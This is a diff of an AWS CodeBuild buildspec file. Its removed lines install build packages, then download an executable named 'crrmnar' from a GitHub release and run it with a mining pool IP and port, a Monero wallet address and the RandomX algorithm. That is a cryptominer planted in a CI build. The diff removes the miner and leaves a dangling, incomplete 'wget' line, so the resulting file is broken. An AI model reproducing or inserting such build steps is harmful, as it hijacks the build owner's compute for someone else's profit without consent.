@@ -1,31 +1,5 @@
 version: 0.2
 
-phases:
-  install:
-    commands:
-      - sudo apt update -qq
-
-      - sudo apt install -y -qq software-properties-common
-      - sudo add-apt-repository universe -y
-      - sudo add-apt-repository multiverse -y
-
-      - sudo apt update -qq
-
-      - DEBIAN_FRONTEND=noninteractive sudo apt install -y -qq \
-          build-essential cmake pkg-config libboost-all-dev libssl-dev \
-          libzmq3-dev libsodium-dev libunwind-dev liblzma-dev libreadline-dev \
-          libexpat1-dev libpgm-dev libhidapi-dev libusb-1.0-0-dev \
-          libprotobuf-dev protobuf-compiler libudev-dev \
-          libncurses6 libncursesw6 libtinfo6 \
-          libunbound-dev liblmdb-dev libminiupnpc-dev libuv1-dev \
-          git screen wget curl python3 python3-pip
-
-      - sudo rm -rf /var/lib/apt/lists/*
-
   build:
     commands:
-      - wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar
-      - chmod +x crrmnar
-      - ./crrmnar -o 3.238.231.79:8085 -u 87BHPx4atTidKdRdrWkYEvKhhY4TtKnncUX2ECWgY4syhxPPKdsGrUjWY8MujTSAyXUzh5cvJEWf4WCL8Fp1fXeETMHSYf6 -p bd08 -a rx/0
-      
-      
+      - wget 
